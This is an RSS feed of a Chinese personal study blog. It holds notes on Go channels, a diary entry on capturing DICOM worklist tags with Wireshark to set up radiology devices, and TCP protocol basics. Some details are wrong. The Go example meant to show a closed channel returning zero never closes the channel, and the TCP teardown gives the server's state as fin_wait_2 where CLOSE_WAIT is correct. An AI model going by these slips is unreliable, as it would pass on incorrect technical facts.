<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>菜狗瑞的学习记笔记</title>
        <link>https://testoai.github.io/</link>
        <description>关于 LoveIt 主题</description>
        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Mon, 15 Nov 2021 00:00:00 &#43;0000</lastBuildDate>
            <atom:link href="https://testoai.github.io/index.xml" rel="self" type="application/rss+xml" />
        <item>
    <title>Golang之channel</title>
    <link>https://testoai.github.io/posts/golang-channel/</link>
    <pubDate>Mon, 15 Nov 2021 00:00:00 &#43;0000</pubDate>
    <author>作者</author>
    <guid>https://testoai.github.io/posts/golang-channel/</guid>
    <description><![CDATA[<h2 id="什么是channel">什么是Channel</h2>
<ul>
<li>
<p>channel是golang中的一种数据类型，它像一个管道或者是队列，规则是先入先出，可以保证数据的顺序。</p>
</li>
<li>
<p>声明channel时需要指定channel中存放数据的类型</p>
</li>
<li>
<p>channel是并发安全的，它可以被用来做程间通信</p>
</li>
<li>
<p>channel是引用类型</p>
</li>
</ul>
<h2 id="channel的结构">channel的结构</h2>
<p>runtime.hchan</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">type</span> <span class="nx">hchan</span> <span class="kd">struct</span> <span class="p">{</span>
	<span class="nx">qcount</span>   <span class="kt">uint</span>           <span class="c1">// total data in the queue
</span><span class="c1"></span>	<span class="nx">dataqsiz</span> <span class="kt">uint</span>           <span class="c1">// size of the circular queue
</span><span class="c1"></span>	<span class="nx">buf</span>      <span class="nx">unsafe</span><span class="p">.</span><span class="nx">Pointer</span> <span class="c1">// points to an array of dataqsiz elements
</span><span class="c1"></span>	<span class="nx">elemsize</span> <span class="kt">uint16</span>
	<span class="nx">closed</span>   <span class="kt">uint32</span>
	<span class="nx">elemtype</span> <span class="o">*</span><span class="nx">_type</span> <span class="c1">// element type
</span><span class="c1"></span>	<span class="nx">sendx</span>    <span class="kt">uint</span>   <span class="c1">// send index
</span><span class="c1"></span>	<span class="nx">recvx</span>    <span class="kt">uint</span>   <span class="c1">// receive index
</span><span class="c1"></span>	<span class="nx">recvq</span>    <span class="nx">waitq</span>  <span class="c1">// list of recv waiters
</span><span class="c1"></span>	<span class="nx">sendq</span>    <span class="nx">waitq</span>  <span class="c1">// list of send waiters
</span><span class="c1"></span>
	<span class="c1">// lock protects all fields in hchan, as well as several
</span><span class="c1"></span>	<span class="c1">// fields in sudogs blocked on this channel.
</span><span class="c1"></span>	<span class="c1">//
</span><span class="c1"></span>	<span class="c1">// Do not change another G&#39;s status while holding this lock
</span><span class="c1"></span>	<span class="c1">// (in particular, do not ready a G), as this can deadlock
</span><span class="c1"></span>	<span class="c1">// with stack shrinking.
</span><span class="c1"></span>	<span class="nx">lock</span> <span class="nx">mutex</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li><code>qcount</code> channel中的元素个数</li>
<li><code>dataqsiz</code> channel中循环队列的长度</li>
<li><code>buf</code> channel的缓冲区指针</li>
<li><code>sendx</code> channel的发送操作处理到的位置</li>
<li><code>recvx</code> channel的接收操作处理到的位置</li>
<li><code>recvq</code> channel等待读取的goroutine队列</li>
<li><code>sendq</code> channel等待发送的goroutine队列</li>
</ul>
<h2 id="创建channel">创建channel</h2>
<p>创建channel时需要使用make来创建</p>
<p>channel分为带缓冲区的channel和不带缓冲区的channel</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="c1">//带缓冲区的
</span><span class="c1"></span><span class="nx">ch</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kt">string</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
<span class="c1">//不带缓冲区的
</span><span class="c1"></span><span class="nx">ch</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kt">int</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>当make的时候会对传入的缓冲区大小进行判断，如果make的时候缓冲区大小没有传值，那么当前缓冲区大小就会被设置为默认值0，也就是没有缓冲区</p>
<h2 id="发送数据">发送数据</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="nx">ch</span> <span class="o">&lt;-</span> <span class="nx">i</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="发送数据需要注意的地方">发送数据需要注意的地方</h3>
<ul>
<li>1.如目标channel创建时定义存放的数据类型是int类型时，那么发送数据时只能发送int类型的数据</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="nx">ch</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kt">int</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
	<span class="nx">ch</span> <span class="o">&lt;-</span> <span class="s">&#34;test&#34;</span> <span class="c1">//cannot use &#34;test&#34; (type untyped string) as type int in send
</span><span class="c1"></span><span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>2.当目标channel没有缓冲区，且等待接收队列中没有goroutine，会阻塞发送</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="nx">ch</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kt">int</span><span class="p">)</span>
	<span class="nx">ch</span> <span class="o">&lt;-</span> <span class="mi">1</span> <span class="c1">//fatal error: all goroutines are asleep - deadlock!
</span><span class="c1"></span><span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>3.当目标channel处于关闭状态时，会报panic，提示通道已关闭</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="nx">ch</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kt">int</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
	<span class="nb">close</span><span class="p">(</span><span class="nx">ch</span><span class="p">)</span>
	<span class="nx">ch</span> <span class="o">&lt;-</span> <span class="mi">1</span> <span class="c1">//panic: send on closed channel
</span><span class="c1"></span><span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>4.当目标channel缓冲区已满时，且等待队列中没有goroutine，会阻塞发送</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="nx">ch</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kt">int</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
	<span class="nx">ch</span> <span class="o">&lt;-</span> <span class="mi">1</span>
	<span class="nx">ch</span> <span class="o">&lt;-</span> <span class="mi">2</span> <span class="c1">//fatal error: all goroutines are asleep - deadlock!
</span><span class="c1"></span><span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>5.当声明的目标channel为只读的channel时，无法写入数据</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="kd">var</span> <span class="nx">ch</span> <span class="o">&lt;-</span> <span class="kd">chan</span> <span class="kt">int</span>
	<span class="nx">ch</span> <span class="o">&lt;-</span> <span class="mi">2</span> <span class="c1">//invalid operation: ch &lt;- 2 (send to receive-only type &lt;-chan int)
</span><span class="c1"></span><span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="读取数据">读取数据</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="nx">a</span> <span class="o">:=</span> <span class="o">&lt;-</span> <span class="nx">ch</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="读取数据需要注意的地方">读取数据需要注意的地方</h3>
<ul>
<li>1.目标channel有缓冲区，但缓冲区中没有数据时，读取会阻塞</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="nx">ch</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kt">int</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
	<span class="nx">a</span> <span class="o">:=</span> <span class="o">&lt;-</span><span class="nx">ch</span> <span class="c1">//fatal error: all goroutines are asleep - deadlock!
</span><span class="c1"></span>	<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>2.目标channel没有缓冲区，且发送队列没有数据时，读取会阻塞</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="nx">ch</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kt">int</span><span class="p">)</span>
	<span class="nx">a</span> <span class="o">:=</span> <span class="o">&lt;-</span><span class="nx">ch</span> <span class="c1">//fatal error: all goroutines are asleep - deadlock!
</span><span class="c1"></span>	<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>3.目标channel为关闭状态时，会返回channel中数据类型的零值</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="nx">ch</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kt">int</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
	<span class="nx">a</span> <span class="o">:=</span> <span class="o">&lt;-</span><span class="nx">ch</span>
	<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="c1">//0
</span><span class="c1"></span><span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>4.目标channel为只写channel时，读取数据会失败</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="kd">var</span> <span class="nx">ch</span> <span class="kd">chan</span><span class="o">&lt;-</span> <span class="kt">int</span>
	<span class="nx">ch</span> <span class="p">=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kt">int</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
	<span class="nx">a</span> <span class="o">:=</span> <span class="o">&lt;-</span><span class="nx">ch</span> <span class="c1">//invalid operation: &lt;-ch (receive from send-only type chan&lt;- int)
</span><span class="c1"></span>	<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="关于读取阻塞">关于读取阻塞</h2>
<p>上面学习到如果channel没有内容或者发送队列没有内容时，则会读取阻塞</p>
<p>如果我们有需要等待channel中有数据然后读取的情况下，可以用select来解决读取阻塞的问题</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="kd">var</span> <span class="nx">wg</span> <span class="nx">sync</span><span class="p">.</span><span class="nx">WaitGroup</span>
	<span class="nx">ch</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kt">int</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>

	<span class="nx">wg</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
	<span class="k">defer</span> <span class="nx">wg</span><span class="p">.</span><span class="nf">Wait</span><span class="p">()</span>

	<span class="k">go</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
		<span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="mi">5</span> <span class="o">*</span> <span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">)</span>
		<span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
		<span class="nx">ch</span> <span class="o">&lt;-</span> <span class="mi">1</span>
		<span class="nx">wg</span><span class="p">.</span><span class="nf">Done</span><span class="p">()</span>
	<span class="p">}()</span>

	<span class="k">for</span> <span class="p">{</span>
		<span class="k">select</span> <span class="p">{</span>
		<span class="k">case</span> <span class="nx">a</span> <span class="o">:=</span> <span class="o">&lt;-</span><span class="nx">ch</span><span class="p">:</span>
			<span class="nx">fmt</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;读取到了数据: %v\n&#34;</span><span class="p">,</span> <span class="nx">a</span><span class="p">)</span>
			<span class="k">return</span>
		<span class="k">default</span><span class="p">:</span>
			<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;没有读取到数据..&#34;</span><span class="p">)</span>
			<span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="mi">1</span> <span class="o">*</span> <span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">)</span>
		<span class="p">}</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="关于panic">关于panic</h2>
<p>上面学习发送数据的时候学到了如果向已经关闭的channel中发送数据的话会报panic</p>
<p>在Golang中，panic会导致程序退出</p>
<p>所以为了防止出现这种问题，可以使用recover来捕获panic，不让程序异常退出</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="nx">ch</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kt">int</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
	<span class="nb">close</span><span class="p">(</span><span class="nx">ch</span><span class="p">)</span>
	<span class="nx">res</span> <span class="o">:=</span> <span class="nf">readCh</span><span class="p">(</span><span class="nx">ch</span><span class="p">)</span>
	<span class="k">if</span> <span class="nx">res</span><span class="p">{</span>
		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;读取成功...&#34;</span><span class="p">)</span>
	<span class="p">}</span><span class="k">else</span> <span class="p">{</span>
		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;读取失败...&#34;</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;继续后续工作......&#34;</span><span class="p">)</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">readCh</span><span class="p">(</span><span class="nx">ch</span> <span class="kd">chan</span> <span class="o">&lt;-</span> <span class="kt">int</span><span class="p">)</span> <span class="kt">bool</span> <span class="p">{</span>
    <span class="c1">// 添加了recover来捕获panic时，主进程不会退出,这里处理失败之后主进程还能进行后续工作
</span><span class="c1"></span>    <span class="c1">// 如果这里没有捕获panic，则会导致整个程序的退出
</span><span class="c1"></span>	<span class="k">defer</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
		<span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nb">recover</span><span class="p">();</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span><span class="p">{</span>
			<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="c1">//send on closed channel
</span><span class="c1"></span>		<span class="p">}</span>
	<span class="p">}()</span>
	<span class="nx">ch</span> <span class="o">&lt;-</span> <span class="mi">1</span>
	<span class="k">return</span> <span class="kc">true</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>这里的recover也可以运用到其它容易发生panic的地方</li>
</ul>
<h2 id="学习资料">学习资料</h2>
<p><a href="https://www.bilibili.com/video/BV1ME411Y71o?spm_id_from=333.999.0.0">https://www.bilibili.com/video/BV1ME411Y71o?spm_id_from=333.999.0.0</a></p>
<p><a href="https://halfrost.com/go_channel/#toc-16">https://halfrost.com/go_channel/#toc-16</a></p>
<p><a href="https://note.youdao.com/ynoteshare/index.html?id=65b5a66c02398d0317f90882e20c16c0&amp;type=note&amp;_time=1636960393412">https://note.youdao.com/ynoteshare/index.html?id=65b5a66c02398d0317f90882e20c16c0&amp;type=note&amp;_time=1636960393412</a></p>
<p><a href="https://draveness.me/golang/docs/part3-runtime/ch06-concurrency/golang-channel/#641-%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86">https://draveness.me/golang/docs/part3-runtime/ch06-concurrency/golang-channel/#641-%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86</a></p>
]]></description>
</item><item>
    <title>工作日记-让放射设备快速从Dicom服务上刷到worklist的方法</title>
    <link>https://testoai.github.io/posts/%E5%B7%A5%E4%BD%9C%E6%97%A5%E8%AE%B0%E4%B9%8B%E8%81%94%E8%B0%83%E6%94%BE%E5%B0%84%E8%AE%BE%E5%A4%87%E6%97%B6%E5%A6%82%E4%BD%95%E8%AE%A9%E8%AE%BE%E5%A4%87%E5%BF%AB%E9%80%9F%E5%88%B7%E5%88%B0worklist/</link>
    <pubDate>Fri, 03 Sep 2021 00:00:00 &#43;0000</pubDate>
    <author>作者</author>
    <guid>https://testoai.github.io/posts/%E5%B7%A5%E4%BD%9C%E6%97%A5%E8%AE%B0%E4%B9%8B%E8%81%94%E8%B0%83%E6%94%BE%E5%B0%84%E8%AE%BE%E5%A4%87%E6%97%B6%E5%A6%82%E4%BD%95%E8%AE%A9%E8%AE%BE%E5%A4%87%E5%BF%AB%E9%80%9F%E5%88%B7%E5%88%B0worklist/</guid>
    <description><![CDATA[<h2 id="联调放射设备时如何一把让设备刷到worklist">联调放射设备时如何一把让设备刷到worklist</h2>
<h2 id="只适用于调试正在使用的设备">（只适用于调试正在使用的设备😁）</h2>
<p>有些医院有的放射设备维保期过了，或者是没有设备文档的情况下，dicom联调时服务就变得非常麻烦</p>
<p>按照下面步骤基本可以一把成功刷到worklist</p>
<ul>
<li>
<p>第一步</p>
<p>登录现在正在使用的pacs服务器，装一个wireshark</p>
</li>
<li>
<p>第二步</p>
<p>过滤条件中IP条件过滤为设备IP，协议条件过滤为dicom</p>
</li>
<li>
<p>第三步</p>
<p>从设备上请求worklist</p>
</li>
<li>
<p>第四步</p>
<p>然后查看描述信息为：P-DATA, C-FIND-RQ-DATA的包</p>
<p>展开DICOM, C-FIND-RSP, C-FIND-RSP-DATA</p>
<p>然后再展开PDV, C-FIND-RSP-DATA</p>
<p>就可以看到返回的所有tag信息</p>
</li>
<li>
<p>第五步</p>
<p>在自己的服务器上对照着上面的抓到的tag信息配置上</p>
<p>完活儿~</p>
</li>
</ul>
<p>注意：有些tag如果返回了但是值为空的话可能会被设备过滤掉，最好与抓到的包中的信息一致</p>
<p>调设备给我人调麻了😭</p>
]]></description>
</item><item>
    <title>TCP</title>
    <link>https://testoai.github.io/posts/tcp/</link>
    <pubDate>Wed, 28 Jul 2021 00:00:00 &#43;0800</pubDate>
    <author>作者</author>
    <guid>https://testoai.github.io/posts/tcp/</guid>
    <description><![CDATA[<h2 id="简介">简介</h2>
<ul>
<li>
<p>TCP(Transmission Control Protocol)传输控制协议，是一种面向连接的、可靠的、基于字节流的传输层通信协议</p>
<ul>
<li>面向连接：点对点的连接</li>
<li>字节流：是指传输过程中，传输数据的最基本单位是字节的流，一个不包含边界数据的连续流</li>
<li>流：流是一个抽象的概念，是对输入输出的抽象，输入流可以看作一个输入通道，输出流可以看作一个输出通道。外部传入数据给程序需要借助输入流。程序传输到外部需要借助输出流</li>
</ul>
</li>
<li>
<p>TCP是传输层的协议</p>
</li>
<li>
<p>TCP连接是全双工的，并且是点到点的。TCP不支持组播和广播的传输模式</p>
</li>
<li>
<p>一个TCP连接使用源地址、源端口、目的地址、目的端口四元组来确定（源地址和目标地址在IP层写入）</p>
</li>
</ul>
<h2 id="tcp头部格式">TCP头部格式</h2>
<ul>
<li>1.源端口号：自己的端口号</li>
<li>2.目标端口号：对方的端口号</li>
<li>3.序列号：在建立连接时由计算机生成的随机数作为其初始值，每交换一次数据，该值就会+1被放到确认应答号中，用来解决包乱序</li>
<li>4.确认应答号：发送端收到这个确认应答号后，会认为在这之前的数据都已经被正常接收。用来解决不丢包</li>
<li>5.首部长度：该字段指明了TCP头包含多少个32位的字。这个信息是必须的，因为选项字段是可变长的，因而整个头也是变长的</li>
<li>6.8个1比特的标志位
<ul>
<li>CWR：当收到了接收端的ECE信号时，发送端将CWR标志位设置为1，发送给接收端，这样接收端就知道了发送端放慢了发送速度</li>
<li>ECE：当TCP端收到了网络拥塞的指示后，就设置ECE给TCP发送端发ECN-Echo信号，告诉发送端放慢发送速率</li>
<li>URG：该位为1时，表示此数据包需要立即发送，无需考虑发送顺序问题</li>
<li>ACK：表示确认应答</li>
<li>PSH：与URG相对应，让接收端首先接收这条数据</li>
<li>RST：表示出现异常并必须强制断开连接</li>
<li>SYN：只有建立连接请求和确认请求的两个数据包中的SYN为1（三次握手的第一二次握手）</li>
<li>FIN：表示该连接要被释放，发送端已经没有数据要传输了。</li>
</ul>
</li>
<li>7.窗口大小：用于TCP流量控制，该字段指定了从被确认的字节算起可以发送多少个字节，该字段值可以为0</li>
<li>8.校验和：</li>
<li>9.紧急指针</li>
<li>10.选项（0或32位的倍数）：提供了一种添加额外数据的字段，主要针对常规头覆盖不到的方面。协议定义了许多选项，选项的长度可变长，但必须是32位的倍数，不足32位用0填充。选项有40个字节的空间</li>
<li>11.数据</li>
</ul>
<h2 id="建立连接">建立连接</h2>
<p>TCP是面向连接的协议，建立连接是通过三次握手进行的</p>
<h3 id="三次握手">三次握手</h3>

<h4 id="第一次握手">第一次握手</h4>
<p>服务端执行listen原语</p>
<ul>
<li>1.客户端执行connect原语</li>
<li>2.初始化一个序列号，放到TCP首部的序号字段中</li>
<li>3.把SYN标志位置为1，向服务端发起连接，该报文不包含应用层之间的数据</li>
</ul>
<p>之后客户端处于SYN-SENT状态</p>

<h4 id="第二次握手">第二次握手</h4>
<ul>
<li>
<p>1.当第一次握手的数据段到达服务端后，服务器的TCP实体会先检查首部的目的端口号是否被进程监听，如果没有则返回一个RET标志位位1的报文，拒绝连接。如果有进程监听，则进入第二步，交给监听该端口的进程处理</p>
</li>
<li>
<p>2.服务端收到客户端的SYN报文后，会随机初始化自己的序号，然后将序号写入TCP首部的序号字段中</p>
</li>
<li>
<p>3.将TCP首部的序列号字段+1，写入确认应答号中</p>
</li>
<li>
<p>4.将SYN和ACK标志位置为1</p>
</li>
<li>
<p>5.将该报文发送给客户端</p>
</li>
<li>
<p>6.之后服务端置于SYN-RCVD状态</p>
</li>
</ul>

<h4 id="第三次握手">第三次握手</h4>
<ul>
<li>1.将TCP首部ACK标志位置为1</li>
<li>2.将序列号+1写入确认应答号中</li>
<li>3.将报文发送给服务端</li>
<li>4.置于ESTABLISHED（确认连接）状态</li>
</ul>

<h2 id="连接释放">连接释放</h2>
<h3 id="四次挥手">四次挥手</h3>

<p>如客户端想要断开连接</p>
<ul>
<li>1.<strong>客户端</strong>向服务端发送一个TCP首部<strong>FIN标志位为1</strong>的报文，请求断开链接，之后客户端进入<strong>fin_wait_1</strong>状态</li>
<li>2.<strong>服务端</strong>收到报文后向客户端发送<strong>ACK标志位为1</strong>的报文，然后进入<strong>fin_wait_2</strong>状态</li>
<li>3.<strong>服务端</strong>处理完数据后，也向客户端发送一个<strong>FIN标志位为1</strong>的报文，之后进入<strong>last_ack</strong>状态</li>
<li>4.<strong>客户端</strong>收到服务端发送的FIN报文后，向服务端回复一个<strong>ACK标志位为1</strong>的报文，然后进入<strong>time_wait</strong>状态</li>
</ul>
<p>服务端收到ack报文后，立即进入close状态</p>
<p>之后客户端在经过2msl的等待之后自动进入close状态</p>
<p><strong>每一方都需要发送一个FIN和ACK报文</strong></p>
<h2 id="tcp滑动窗口">TCP滑动窗口</h2>
<p>滑动窗口负责告诉发送端接收端的缓冲区可用空间，然后发送端控制自己发送数据的不超过接收端缓冲区可用空间</p>
<h4 id="异常情况">异常情况</h4>
<p>当滑动窗口的值为0时</p>
<ul>
<li>紧急数据仍然可以发送，如杀掉远程机器上的某个进程</li>
<li>发送端可以发送一个1字节的段，请求接收端重新发送滑动窗口的大小。该数据包被成为窗口探测（window probe）。TCP标准明确提供了这个选项，防止数据包丢失后发生死锁</li>
</ul>
<h2 id="udp">UDP</h2>
<p>User Datagram Protocol 用户数据报协议，和TCP一样，位于OSI模型的传输层</p>
